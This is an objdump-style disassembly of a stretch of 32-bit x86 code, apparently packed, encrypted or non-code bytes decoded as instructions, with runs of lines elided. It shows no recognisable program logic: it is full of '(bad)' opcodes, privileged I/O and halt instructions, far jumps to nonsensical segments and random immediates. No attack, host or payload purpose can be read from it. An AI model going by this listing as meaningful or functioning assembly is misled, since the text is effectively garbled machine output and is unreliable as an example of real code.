  41faee:	mov    BYTE PTR ds:0xdfcb0e25,bh
  41faf4:	outs   dx,BYTE PTR ds:[esi]
  41faf5:	add    BYTE PTR [esp+edx*8],cl
  41faf8:	xor    al,0x25
  41fafa:	adc    al,0x22
  41fafc:	and    BYTE PTR [ebx+0x34],dh
  41faff:	dec    esi
  41fb00:	std    
  41fb01:	test   eax,0xee51f533
  41fb06:	sub    DWORD PTR [ebx+0x641b2276],ebx
  41fb0c:	xchg   ecx,eax
  41fb0d:	jmp    0x72fa2ef9
  41fb12:	out    0xfa,al
  41fb14:	cmc    
  41fb15:	mov    cl,0xbf
  41fb17:	jmp    0x5a30701b
  41fb1c:	jge    0x41faea
  41fb1e:	jb     0x41fb79
  41fb20:	shl    DWORD PTR [esi-0x1cc99cc2],1
  41fb26:	and    DWORD PTR [ebp+0x5797a587],0x465504b7
  41fb30:	push   0x196e99f4
  41fb35:	pop    ds
  41fb36:	sbb    DWORD PTR [ebx-0x40],0x4b
  41fb3a:	out    0x36,al
  41fb3c:	(bad)  
  41fb3d:	rcr    BYTE PTR [ebx+edx*2-0x5751d7ad],cl
  41fb44:	add    al,0x67
  41fb46:	pushf  
  41fb47:	sbb    al,0xbc
  41fb49:	mov    ch,0x2e
  41fb4b:	fnstsw WORD PTR [ecx+0x30]
  41fb4e:	mov    eax,DWORD PTR [eax-0x2883bba1]
  41fb54:	pop    ds
  41fb55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb56:	retf   
  41fb57:	in     eax,0xa1
  41fb59:	mov    ah,0x45
  41fb5b:	mov    al,0x1e
  41fb5d:	call   0x7bb0:0xb2aa124f
  41fb64:	dec    esi
  41fb65:	or     al,0x67
  41fb67:	ins    BYTE PTR es:[edi],dx
  41fb68:	sbb    eax,ebp
  41fb6a:	pusha  
  41fb6b:	push   ds
  41fb6c:	add    eax,0xdcea3833
  41fb71:	mov    DWORD PTR [ecx+0x4a],0x4e837963
  41fb78:	mov    BYTE PTR [eax-0x52],dl
  41fb7b:	sbb    eax,0xd8e27641
  41fb80:	dec    ebp
  41fb81:	mov    bh,0x4d
  41fb83:	test   eax,0x5d69d1f0
  41fb88:	xchg   edx,eax
  41fb89:	ficom  DWORD PTR ds:0xd9711b1c
  41fb8f:	dec    edi
  41fb90:	mov    edx,0xa09a075a
  41fb95:	outs   dx,DWORD PTR ds:[esi]
  41fb96:	inc    ecx
  41fb97:	int3   
  41fb98:	fbstp  TBYTE PTR [ecx-0x2b3a899c]
  41fb9e:	xor    DWORD PTR [edx+0x44ac5bb2],0x58769256
  41fba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fba9:	outs   dx,BYTE PTR ds:[esi]
  41fbaa:	or     DWORD PTR [ecx-0x11],edx
  41fbad:	inc    esi
  41fbae:	sbb    al,0xae
  41fbb0:	test   DWORD PTR [edx-0x33],ebp
  41fbb3:	adc    bl,BYTE PTR [edx-0x7b]
  41fbb6:	iret   
  41fbb7:	ror    ch,cl
  41fbb9:	xchg   esp,eax
  41fbba:	fstp   QWORD PTR [edx]
  41fbbc:	pop    eax
  41fbbd:	ficom  WORD PTR [edi+0x1f]
  41fbc0:	push   edi
	...
  41fc31:	add    BYTE PTR [eax],al
  41fc33:	add    BYTE PTR [ecx-0xf],al
  41fc36:	(bad)
  41fc39:	hlt    
  41fc3a:	gs icebp 
  41fc3c:	push   edx
  41fc3d:	sub    eax,0xad808ad2
  41fc42:	dec    edx
  41fc43:	jns    0x41fbd5
  41fc45:	push   esp
  41fc46:	add    DWORD PTR [eax],eax
  41fc48:	cmc    
  41fc49:	add    BYTE PTR [eax],al
  41fc4b:	add    bl,ch
  41fc4d:	retf   
  41fc4e:	adc    al,0x65
  41fc50:	mov    bh,0xc
  41fc52:	jle    0x41fc0f
  41fc54:	jecxz  0x41fc67
  41fc56:	ret    0xa612
  41fc59:	inc    ecx
  41fc5a:	in     al,0xd8
  41fc5c:	test   DWORD PTR [edx+0x68],ecx
  41fc5f:	imul   ebp,ebp,0x6b
  41fc62:	dec    ebx
  41fc63:	pop    ss
  41fc64:	xor    ah,ch
  41fc66:	(bad)  
  41fc68:	xchg   ecx,eax
  41fc69:	fs sbb bh,bl
  41fc6c:	push   eax
  41fc6d:	into   
  41fc6e:	mov    ah,0x6a
  41fc70:	(bad)  
  41fc71:	mov    ds:0x9c7a61ba,eax
  41fc76:	popa   
  41fc77:	aas    
  41fc78:	inc    edx
  41fc79:	mov    cl,0xab
  41fc7b:	dec    edi
  41fc7c:	sbb    BYTE PTR [ebp+0x6c],0x64
  41fc80:	push   edi
  41fc81:	mov    ah,0xea
  41fc83:	out    dx,eax
  41fc84:	xchg   edi,eax
  41fc85:	sub    al,ch
  41fc87:	xchg   ebp,eax
  41fc88:	dec    ebx
  41fc89:	leave  
  41fc8a:	sub    dl,al
  41fc8c:	mov    edi,0x26c7fc02
  41fc91:	cmp    al,0x90
  41fc93:	dec    edx
  41fc94:	(bad)  
  41fc95:	ins    DWORD PTR es:[edi],dx
  41fc96:	lds    edi,FWORD PTR [ebx+0x75]
  41fc99:	repnz mov ebx,0x9a175df6
  41fc9f:	loope  0x41fcf9
  41fca1:	dec    ebx
  41fca2:	repz mov edx,0xd287964
  41fca8:	inc    edi
  41fca9:	call   0xd6a9:0x4d21af64
  41fcb0:	mul    DWORD PTR [edi]
  41fcb2:	jae    0x41fce0
  41fcb4:	fsubrp st(3),st
  41fcb6:	inc    esp
  41fcb7:	add    eax,0x9eea38
  41fcbc:	stos   DWORD PTR es:[edi],eax
  41fcbd:	mov    es,ecx
  41fcbf:	jae    0x41fcaa
  41fcc1:	xchg   ebx,eax
  41fcc2:	push   0xee1022df
  41fcc7:	enter  0x67bf,0x91
  41fccb:	mov    esp,0x72014b2c
  41fcd0:	loop   0x41fd0c
  41fcd2:	pop    edi
  41fcd3:	outs   dx,DWORD PTR ds:[esi]
  41fcd4:	(bad)  
  41fcd6:	std    
  41fcd7:	and    BYTE PTR [edx+0x5c54b24a],al
  41fcdd:	aaa    
  41fcde:	mov    BYTE PTR [esi+0x1ef72f51],ch
  41fce4:	mul    BYTE PTR [eax]
  41fce6:	add    eax,0xeb7dc1ec
  41fceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcec:	pop    edx
  41fced:	out    0xdb,eax
  41fcef:	jmp    0x41fd51
  41fcf1:	mov    dl,0xd9
  41fcf3:	mov    ecx,0x3ea7aa18
  41fcf8:	adc    al,ah
  41fcfa:	xor    eax,0x54017660
  41fcff:	int3   
  41fd00:	aam    0xf6
  41fd02:	adc    BYTE PTR [ecx],ah
  41fd04:	push   edx
  41fd05:	jnp    0x41fcdc
  41fd07:	add    DWORD PTR [ebp-0x2],edx
  41fd0a:	rcl    DWORD PTR [ebp-0x3c],0x14
  41fd0e:	cmc    
  41fd0f:	call   0xc9d:0x526ad1de
  41fd16:	stos   BYTE PTR es:[edi],al
  41fd17:	push   edi
  41fd18:	push   edx
  41fd19:	mov    ecx,0x9edf0dbe
  41fd1e:	ins    DWORD PTR es:[edi],dx
  41fd1f:	outs   dx,DWORD PTR ds:[esi]
  41fd20:	xchg   esi,edx
  41fd22:	push   esp
  41fd23:	enter  0xe9c2,0x15
  41fd27:	out    0x1d,eax
  41fd29:	jns    0x41fd2a
  41fd2b:	test   eax,0xdcdad547
  41fd30:	into   
  41fd31:	popf   
  41fd32:	xor    al,BYTE PTR [ebx]
  41fd34:	mov    ch,0xe3
  41fd36:	pop    edi
  41fd37:	inc    edi
  41fd38:	mov    al,gs:0x6ea933f6
  41fd3e:	aad    0x8f
  41fd40:	cmp    al,BYTE PTR [eax]
	...
  41fdb2:	add    BYTE PTR [eax],al
  41fdb4:	add    eax,0x7b197956
  41fdb9:	aas    
  41fdba:	gs pop esi
  41fdbc:	repnz lahf 
  41fdbe:	and    al,0x2d
  41fdc0:	ss jno 0x41fe1a
  41fdc3:	xchg   esi,eax
  41fdc4:	test   DWORD PTR [ebp+0x1],edx
  41fdc7:	add    ch,dh
  41fdc9:	add    BYTE PTR [eax],al
  41fdcb:	add    BYTE PTR [edx],dh
  41fdcd:	retf   0x4b73
  41fdd0:	and    DWORD PTR [eax+0x1d],0x977d1094
  41fdd7:	mov    bh,0x94
  41fdd9:	das    
  41fdda:	inc    ecx
  41fddb:	iret   
  41fddc:	out    dx,al
  41fddd:	mov    eax,0x7b48ee74
  41fde2:	je     0x41fdf6
  41fde4:	mov    cl,0x9
  41fde6:	out    0x56,al
  41fde8:	ror    BYTE PTR [edi],cl
  41fdea:	lds    ebp,FWORD PTR [ecx+0x4dffc60d]
  41fdf0:	inc    esp
  41fdf1:	and    DWORD PTR [edx],0xffffffa3
  41fdf4:	lahf   
  41fdf5:	les    esp,FWORD PTR [ebx+0x53]
  41fdf8:	imul   edi,DWORD PTR [edi+ebp*1+0x668f2a4c],0xa338230b
  41fe03:	mov    bh,0xf4
  41fe05:	imul   esp,ebx,0x6c3d3fed
  41fe0b:	xchg   ebp,eax
  41fe0c:	pop    ebp
  41fe0d:	sbb    al,0xae
  41fe0f:	daa    
  41fe10:	jne    0x41fd9c
  41fe12:	imul   ebp,ebp,0x59
  41fe15:	cmp    ecx,DWORD PTR ds:0x570aedf8
  41fe1b:	fstp   DWORD PTR [ebx-0x16]
  41fe1e:	mov    al,0xad
  41fe20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe21:	icebp  
  41fe22:	push   0x4d
  41fe24:	adc    eax,0xe34594d9
  41fe29:	dec    esi
  41fe2a:	inc    eax
  41fe2b:	xchg   edx,eax
  41fe2c:	(bad)  
  41fe2d:	adc    al,0x29
  41fe2f:	sub    esi,DWORD PTR [ebx+0x69]
  41fe32:	gs sbb al,0xb3
  41fe35:	adc    DWORD PTR [eax-0x5db58415],ebp
  41fe3b:	cmp    eax,0xbc4b4bbc
  41fe40:	cli    
  41fe41:	bound  esi,QWORD PTR [eax+0x60]
  41fe44:	jg     0x41fde7
  41fe46:	or     esi,ebp
  41fe48:	bound  ecx,QWORD PTR [eax-0x5ee485a3]
  41fe4e:	test   ebp,0x9f3e58e8
  41fe54:	cmp    WORD PTR [esi-0x49],0x1e
  41fe59:	push   ds
  41fe5a:	hlt    
  41fe5b:	fcmovne st,st(3)
  41fe5d:	push   ds
  41fe5e:	xor    BYTE PTR [esi+eiz*1-0x219aab09],0x2f
  41fe66:	add    DWORD PTR [edi],edi
  41fe68:	or     BYTE PTR [esi+0x73],0x75
  41fe6c:	icebp  
  41fe6d:	adc    DWORD PTR [esp-0x392823c6],esp
  41fe74:	mov    cl,0xe9
  41fe76:	aad    0x29
  41fe78:	xchg   ecx,eax
  41fe79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe7a:	dec    eax
  41fe7b:	inc    ebp
  41fe7c:	mov    ah,0x4
  41fe7e:	pop    edx
  41fe7f:	jno    0x41fec0
  41fe81:	pop    edi
  41fe82:	ins    DWORD PTR es:[edi],dx
  41fe83:	dec    eax
  41fe84:	cmp    BYTE PTR [ebp-0x54],bl
  41fe87:	sub    BYTE PTR [ebp+eiz*4+0x5e],ah
  41fe8b:	xchg   al,al
  41fe8d:	mov    fs,WORD PTR [eax+eiz*1+0x8]
  41fe91:	fs aad 0x8d
  41fe94:	loop   0x41fe74
  41fe96:	inc    esi
  41fe97:	and    esp,DWORD PTR [esi-0x65]
  41fe9a:	inc    eax
  41fe9b:	and    cl,BYTE PTR [edi+0x36]
  41fe9e:	push   ecx
  41fe9f:	shl    DWORD PTR [edi],0xda
  41fea2:	mov    al,ds:0x909f8b81
  41fea7:	iret   
  41fea8:	jae    0x41fed3
  41feaa:	pushf  
  41feab:	sub    ah,BYTE PTR [edx]
  41fead:	cs jnp 0x41feb2
  41feb0:	sti    
  41feb1:	pop    ebp
  41feb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feb3:	jb     0x41fe51
  41feb5:	fucomip st,st(3)
  41feb7:	fnstcw WORD PTR [ebp-0x34]
  41feba:	popf   
  41febb:	mov    esp,edi
  41febd:	sbb    edx,eax
  41febf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fec0:	pusha  
	...
  41ff31:	add    BYTE PTR [eax],al
  41ff33:	add    BYTE PTR [ecx-0xda40a3],bh
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi-0x91365b1],?
  41ff44:	jp     0x41ff9c
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	cmc    
  41ff49:	add    BYTE PTR [eax],al
  41ff4b:	add    BYTE PTR [esi],bh
  41ff4d:	repz (bad) 
  41ff4f:	sub    eax,0xbe391f08
  41ff54:	inc    edx
  41ff55:	fdivp  st(1),st
  41ff57:	cdq    
  41ff58:	popa   
  41ff59:	icebp  
  41ff5a:	jp     0x41ff65
  41ff5c:	icebp  
  41ff5d:	jae    0x41ffb8
  41ff5f:	test   BYTE PTR fs:[eax-0x2e],cl
  41ff63:	pusha  
  41ff64:	stos   DWORD PTR es:[edi],eax
  41ff65:	cmp    esi,DWORD PTR [ecx+0x59f62f01]
  41ff6b:	xor    BYTE PTR [ecx],dl
  41ff6d:	pop    ebx
  41ff6e:	mov    ecx,0x81d74428
  41ff73:	sub    al,0xa6
  41ff75:	xchg   ebx,eax
  41ff76:	icebp  
  41ff77:	push   es
  41ff78:	jnp    0x41ff6a
  41ff7a:	imul   DWORD PTR ds:0xe8d649ba
  41ff80:	push   edi
  41ff81:	mov    ecx,0x6f99eaff
  41ff86:	xor    DWORD PTR [eax+0x5a],ebx
  41ff89:	or     bl,0xd5
  41ff8c:	push   es
  41ff8d:	push   ebx
  41ff8e:	sbb    al,0x2c
  41ff90:	xor    BYTE PTR [eax+0x466093ab],al
  41ff96:	add    al,0xc2
  41ff98:	in     al,0x56
  41ff9a:	mov    ds:0xa94074e3,eax
  41ff9f:	into   
  41ffa0:	and    al,0x43
  41ffa2:	push   ecx
  41ffa3:	and    edx,0xffffffcd
  41ffa6:	inc    edi
  41ffa7:	clc    
  41ffa8:	out    0x1a,eax
  41ffaa:	jmp    0x41ff9c
  41ffac:	adc    ebp,esi
  41ffae:	adc    dh,BYTE PTR ds:0x36a967a3
  41ffb4:	imul   ebp,DWORD PTR [ecx+0x21c1ad70],0x26
  41ffbb:	ins    BYTE PTR es:[edi],dx
  41ffbc:	add    esi,DWORD PTR [ecx+0x16]
  41ffbf:	test   BYTE PTR [eax+0x1f1c4343],0xbe
  41ffc6:	xor    esi,DWORD PTR [ebx+ebp*1-0x22]
  41ffca:	adc    bl,BYTE PTR [eax-0x2a]
  41ffcd:	loope  0x420005
  41ffcf:	and    bl,bl
  41ffd1:	dec    esp
  41ffd2:	jl     0x420026
  41ffd4:	repz push ds
  41ffd6:	push   edx
  41ffd7:	dec    ebx
  41ffd8:	arpl   WORD PTR es:[edx+0x51cb2a49],ax
  41ffdf:	and    BYTE PTR [edx-0x44a01b30],ah
  41ffe5:	push   ecx
  41ffe6:	rcl    BYTE PTR [ebp+0x27b1da2f],0xce
  41ffed:	out    dx,eax
  41ffee:	inc    bp
  41fff0:	lock outs dx,BYTE PTR ds:[esi]
  41fff2:	pushf  
  41fff3:	xor    dh,BYTE PTR [ebx+0x54a65b6]
  41fff9:	or     ebx,DWORD PTR [esi]
  41fffb:	not    DWORD PTR [edi+eiz*4-0x25804d00]
  420002:	mov    cl,0x4e
  420004:	push   eax
  420005:	xchg   esp,eax
  420006:	and    eax,0x72f3f759
  42000b:	jne    0x42008a
  42000d:	pop    esi
  42000e:	pop    ebx
  42000f:	mov    ebp,0x5ed0bb00
  420014:	add    al,0xeb
  420016:	push   DWORD PTR [ebp+0x6be469c6]
  42001c:	push   edi
  42001d:	sub    eax,DWORD PTR ds:0x743b0d76
  420023:	mov    dl,0xde
  420025:	push   edx
  420026:	pop    ss
  420027:	repnz inc edi
  420029:	or     BYTE PTR [ecx+0x5e8bd0a6],dl
  42002f:	(bad)  
  420030:	std    
  420031:	jecxz  0x420038
  420033:	xchg   ebx,eax
  420034:	and    al,0x51
  420036:	mov    ds,WORD PTR [ebp-0x4a5015b4]
  42003c:	clc    
  42003d:	mov    ds:0x587f97,eax
	...
  4200b2:	add    BYTE PTR [eax],al
  4200b4:	fild   QWORD PTR [edx+ebp*1+0x6c]
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax-0x27bc3d1a],ax
  4200c4:	outs   dx,DWORD PTR ds:[esi]
  4200c5:	push   edi
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	cmc    
  4200c9:	add    BYTE PTR [eax],al
  4200cb:	add    BYTE PTR [ecx+ecx*8-0x28019260],dl
  4200d2:	mov    ebx,DWORD PTR [esi]
  4200d4:	push   esp
  4200d5:	or     esi,DWORD PTR [edi+eiz*2-0x6d216c47]
  4200dc:	cmp    BYTE PTR [edi+0x61060d29],dh
  4200e2:	jns    0x420070
  4200e4:	push   ds
  4200e5:	and    al,0x9f
  4200e7:	mov    esi,DWORD PTR [ecx-0x2d]
  4200ea:	loop   0x420160
  4200ec:	leave  
  4200ed:	int3   
  4200ee:	idiv   DWORD PTR [ecx]
  4200f0:	fadd   DWORD PTR [ebx-0x255d0e3f]
  4200f6:	mov    BYTE PTR ds:0x524992b,0xf5
  4200fd:	icebp  
  4200fe:	mov    WORD PTR gs:[ecx-0x22],cs
  420102:	push   ds
  420103:	cs enter 0x181d,0xf8
  420108:	in     al,0xe8
  42010a:	cmp    bh,0xaf
  42010d:	ret    0x8cea
  420110:	fist   DWORD PTR [edx+eiz*2+0x5e07a2d4]
  420117:	ret    
  420118:	dec    DWORD PTR [eax+edx*4+0x12]
  42011c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42011d:	pop    ds
  42011e:	or     ch,BYTE PTR [esi]
  420120:	nop
  420121:	call   FWORD PTR [esi+0x23]
  420124:	cmp    eax,0xefab4be0
  420129:	xor    edi,DWORD PTR [esi+0x725526f]
  42012f:	sbb    al,0xd5
  420131:	lock push eax
  420133:	jl     0x4200cd
  420135:	in     al,0x9c
  420137:	mov    dl,0x97
  420139:	jb     0x42013d
  42013b:	vcvtss2sd xmm3,xmm1,DWORD PTR [edx+edx*2-0x4e]
  420141:	cmc    
  420142:	adc    BYTE PTR [ebp-0x33cea912],dl
  420148:	inc    edi
  420149:	adc    BYTE PTR [ebp+0x417a5d39],bl
  42014f:	cmp    ah,0xfe
  420152:	loope  0x420146
  420154:	bound  esp,QWORD PTR [edx+0x78f40b9d]
  42015a:	data16 lock xor al,0x5a
  42015e:	xchg   edi,eax
  42015f:	cmp    al,0xf
  420161:	push   ss
  420162:	xchg   BYTE PTR [ecx+eiz*4+0x45],ch
  420166:	shl    DWORD PTR [edi+ecx*1-0x4b6c3bfe],1
  42016d:	pop    ss
  42016e:	cdq    
  42016f:	lods   eax,DWORD PTR ds:[esi]
  420170:	aaa    
  420171:	fsub   DWORD PTR ds:0xba089fb5
  420177:	and    ah,ch
  420179:	or     bh,dl
  42017b:	mov    dl,0x54
  42017d:	repz lahf 
  42017f:	or     eax,0xc5fa8e76
  420184:	mov    edx,0xae6984de
  420189:	sub    al,0x82
  42018b:	push   ds
  42018c:	out    dx,al
  42018d:	mov    edx,0x2b9ea89d
  420192:	jp     0x42014c
  420194:	push   cs
  420195:	ja     0x420197
  420197:	push   DWORD PTR [ebx+0x30]
  42019a:	xchg   ebp,eax
  42019b:	jl     0x4201ef
  42019d:	pop    edx
  42019e:	sbb    DWORD PTR [edi-0x51d6b587],ebx
  4201a4:	xor    dl,BYTE PTR [eax-0x265b5]
  4201aa:	mov    ebp,0x125e9978
  4201af:	pop    ebx
  4201b0:	mov    cl,cl
  4201b2:	xor    edi,esp
  4201b4:	mov    ebx,0xcb07d4ef
  4201b9:	or     BYTE PTR [edx],al
  4201bb:	dec    eax
  4201bc:	lock xor DWORD PTR [edx+0x60],ecx
	...
  420234:	push   ecx
  420235:	sbb    edi,edi
  420237:	jmp    si
  42023a:	fnstcw WORD PTR [edi]
  42023c:	mov    DWORD PTR ds:0xfcc3d010,ebx
  420242:	shl    BYTE PTR gs:[eax+ebx*2+0x1],cl
  420247:	add    ch,dh
  420249:	add    BYTE PTR [eax],al
  42024b:	add    BYTE PTR [eax+esi*8-0x1d7344dd],dl
  420252:	ret    0xe208
  420255:	cmp    DWORD PTR [ecx-0x3c86450d],0x4de0e517
  42025f:	pop    ds
  420260:	into   
  420261:	cld    
  420262:	mov    al,ds:0xf5abeaf3
  420267:	sub    DWORD PTR [edx-0x4f],esp
  42026a:	jp     0x42028d
  42026c:	adc    edx,DWORD PTR [ebx-0x10c3724b]
  420272:	push   ebx
  420273:	imul   esi,DWORD PTR [esp+edi*2+0x39],0x4b
  420278:	in     al,0xdb
  42027a:	jo     0x4202e8
  42027c:	mov    bl,0xe6
  42027e:	pop    edi
  42027f:	retf   0x7eb5
  420282:	pop    es
  420283:	and    DWORD PTR [esi-0x560d4167],ecx
  420289:	je     0x420233
  42028b:	push   edx
  42028c:	test   DWORD PTR [edx+ebp*4+0x61850e9a],esp
  420293:	push   cs
  420294:	xchg   ebp,edi
  420296:	push   edx
  420297:	pop    ds
  420298:	xor    al,dh
  42029a:	pop    esi
  42029b:	mov    ebx,0x1a15f7fd
  4202a0:	sbb    edx,edx
  4202a2:	leave  
  4202a3:	pop    edx
  4202a4:	add    eax,0xcacd2311
  4202a9:	mov    al,0xcb
  4202ab:	loope  0x420262
  4202ad:	jnp    0x4202b9
  4202af:	aad    0x2c
  4202b1:	sbb    BYTE PTR [ecx-0x5bd98158],bl
  4202b7:	stos   DWORD PTR es:[edi],eax
  4202b8:	push   esi
  4202b9:	sub    BYTE PTR [ecx+0x2a],ch
  4202bc:	jno    0x42030a
  4202be:	ins    BYTE PTR es:[edi],dx
  4202bf:	imul   edi,DWORD PTR ds:[esi],0x6b
  4202c3:	or     al,0xb4
  4202c5:	dec    edi
  4202c6:	mov    al,0x94
  4202c8:	ficom  WORD PTR [eax]
  4202ca:	dec    eax
  4202cb:	nop
  4202cc:	not    DWORD PTR [ecx+0x1d3df5f0]
  4202d2:	in     eax,0x72
  4202d4:	ja     0x420310
  4202d6:	ret    0x65c4
  4202d9:	dec    esp
  4202da:	inc    edi
  4202db:	add    BYTE PTR [ecx],al
  4202dd:	stc    
  4202de:	mov    dh,0xe5
  4202e0:	xor    BYTE PTR [ecx+0x23],bl
  4202e3:	sub    eax,0x3bb4d1b9
  4202e8:	lahf   
  4202e9:	pop    eax
  4202ea:	inc    eax
  4202eb:	xchg   esp,eax
  4202ec:	daa    
  4202ed:	scas   eax,DWORD PTR es:[edi]
  4202ee:	pop    ebp
  4202ef:	cmp    bh,BYTE PTR [edi-0x3]
  4202f2:	std    
  4202f3:	ret    0xc7db
  4202f6:	cwde   
  4202f7:	mul    BYTE PTR fs:[edx-0x9]
  4202fb:	lods   al,BYTE PTR fs:[esi]
  4202fd:	stc    
  4202fe:	gs jmp 0x6c6db225
  420304:	arpl   WORD PTR [edx],dx
  420306:	(bad)  
  420307:	sub    al,0x11
  420309:	ret    
  42030a:	addr16 jo 0x420298
  42030d:	sbb    eax,DWORD PTR [edi]
  42030f:	aas    
  420310:	sub    BYTE PTR [ecx+0x17],0xbc
  420314:	scas   al,BYTE PTR es:[edi]
  420315:	inc    esi
  420316:	pop    esp
  420317:	and    DWORD PTR [edx+0x71],ebp
  42031a:	adc    BYTE PTR [ebx-0x17],bh
  42031d:	ins    BYTE PTR es:[edi],dx
  42031e:	iret   
  42031f:	icebp  
  420320:	jmp    FWORD PTR [ecx-0x3c]
  420323:	mov    ds:0xef71cb82,al
  420328:	push   cs
  420329:	xchg   edi,eax
  42032a:	and    ch,BYTE PTR [edx+0x310c87ff]
  420330:	ja     0x4202ed
  420332:	imul   edi,DWORD PTR [ebp-0x47749d71],0xb59fe648
  42033c:	push   eax
  42033d:	mov    ch,0x16
  42033f:	xor    al,0x87
	...
  4203b1:	add    BYTE PTR [eax],al
  4203b3:	add    BYTE PTR [edi+eiz*8],bh
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   WORD PTR [edx],bp
  4203c1:	mov    ebx,0x5959d65c
  4203c6:	add    DWORD PTR [eax],eax
  4203c8:	cmc    
  4203c9:	add    BYTE PTR [eax],al
  4203cb:	add    BYTE PTR [ebp-0x4f],ah
  4203ce:	pop    edx
  4203cf:	xchg   DWORD PTR [ebp+0x48f7e3bb],edi
  4203d5:	jae    0x420361
  4203d7:	shl    al,0x8b
  4203da:	ja     0x420414
  4203dc:	pop    esi
  4203dd:	adc    dh,BYTE PTR [esi]
  4203df:	pushf  
  4203e0:	lahf   
  4203e1:	bound  ecx,QWORD PTR [esi]
  4203e3:	mov    ebp,0xd146d299
  4203e8:	jmp    0xdf95:0x75e62780
  4203ef:	fisttp WORD PTR [ecx+ecx*1+0x6968a974]
  4203f6:	jae    0x420397
  4203f8:	in     al,0xde
  4203fa:	jb     0x4203d4
  4203fc:	sbb    ebp,ebx
  4203fe:	mov    bh,BYTE PTR [edi]
  420400:	repnz push 0x61834cba
  420406:	psllw  mm1,QWORD PTR [ebx]
  420409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42040a:	aad    0x25
  42040c:	les    eax,FWORD PTR [esi+0x615dac8d]
  420412:	xor    DWORD PTR [edi],edi
  420414:	pop    edx
  420415:	jnp    0x420481
  420417:	fs aas 
  420419:	cldemote BYTE PTR [edx-0x7b]
  42041d:	jnp    0x420410
  42041f:	lock call 0xaee3:0x399a8507
  420427:	cli    
  420428:	pop    ebx
  420429:	call   0xd1249c84
  42042e:	mov    cs,WORD PTR [esi]
  420430:	mov    esi,0xaa02cf8a
  420435:	(bad)  
  420437:	scas   eax,DWORD PTR es:[edi]
  420438:	dec    ebp
  420439:	retf   0x2718
  42043c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42043d:	jae    0x420443
  42043f:	pop    ss
  420440:	mov    BYTE PTR [ebp+0x3e42d584],cl
  420446:	inc    ebp
  420447:	jmp    0xd653:0xd9c2f205
  42044e:	jle    0x4203e6
  420450:	dec    ecx
  420451:	cmp    ecx,edi
  420453:	fsub   DWORD PTR [esp+esi*1+0x6f]
  420457:	ins    DWORD PTR es:[edi],dx
  420458:	jmp    0x3226f16a
  42045d:	mov    ebp,0x8a234c08
  420462:	mov    ah,0xb9
  420464:	outs   dx,DWORD PTR ds:[esi]
  420465:	sub    al,0xeb
  420467:	aam    0xa9
  420469:	aas    
  42046a:	dec    ebp
  42046b:	pushf  
  42046c:	xchg   edx,eax
  42046d:	bound  ebp,QWORD PTR [ebx]
  42046f:	ins    BYTE PTR es:[edi],dx
  420470:	push   eax
  420471:	mov    bh,0xaf
  420473:	sbb    al,0x12
  420475:	xchg   DWORD PTR [ecx-0xce8ece9],ebx
  42047b:	in     al,dx
  42047c:	jne    0x4204a8
  42047e:	retf   
  42047f:	(bad)  
  420480:	ds cwde 
  420482:	push   ebx
  420483:	and    ebx,DWORD PTR [ebp+0x681eab16]
  420489:	or     DWORD PTR [esi+0x5c001d38],ecx
  42048f:	(bad)
  420493:	lea    eax,[edi]
  420495:	(bad)  
  420496:	push   0x34
  420498:	cmp    edi,ebp
  42049a:	int3   
  42049b:	fidivr WORD PTR [ecx+0x4448e4fe]
  4204a1:	sbb    BYTE PTR [ebx],al
  4204a3:	nop
  4204a4:	call   edx
  4204a6:	adc    eax,0xba82c393
  4204ab:	in     eax,0xcb
  4204ad:	inc    edx
  4204ae:	popf   
  4204af:	stos   DWORD PTR es:[edi],eax
  4204b0:	scas   eax,DWORD PTR es:[edi]
  4204b1:	pop    ebp
  4204b2:	outs   dx,DWORD PTR ds:[esi]
  4204b3:	cli    
  4204b4:	xchg   edx,eax
  4204b5:	add    al,0xab
  4204b7:	xchg   BYTE PTR [esp+ecx*4+0x4],dh
  4204bb:	dec    edi
  4204bc:	pop    esi
  4204bd:	cmp    esp,DWORD PTR [ebx]
  4204bf:	lods   al,BYTE PTR ds:[esi]
  4204c0:	sub    BYTE PTR [eax],al
	...
  420532:	add    BYTE PTR [eax],al
  420534:	js     0x42056a
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	jl     0x4205a8
  420542:	add    DWORD PTR [esi+0x15a4e],esi
  420548:	cmc    
  420549:	add    BYTE PTR [eax],al
  42054b:	add    BYTE PTR [edi-0x3d569b1],cl
  420551:	loop   0x420585
  420553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420554:	inc    eax
  420555:	imul   edi,edi,0x321355a5
  42055b:	xchg   ebx,eax
  42055c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42055d:	(bad)  
  42055e:	sti    
  42055f:	gs cdq 
  420561:	and    al,0xe5
  420563:	cmp    DWORD PTR [ecx-0x23],ecx
  420566:	inc    esp
  420567:	imul   edx,edi,0x4fe49035
  42056d:	inc    eax
  42056e:	imul   esp,DWORD PTR [ebx-0x35],0xffffffb0
  420572:	inc    ecx
  420573:	pop    ds
  420574:	jbe    0x420575
  420576:	and    al,0x23
  420578:	jmp    0xd3be:0x9b9a7bd0
  42057f:	or     DWORD PTR ds:0xc3a68e9f,ebx
  420585:	mov    dh,0x11
  420587:	sub    al,0xb7
  420589:	jmp    0x6db55e7e
  42058e:	les    ebx,FWORD PTR [edx]
  420590:	(bad)  
  420591:	fimul  DWORD PTR [ebx]
  420593:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
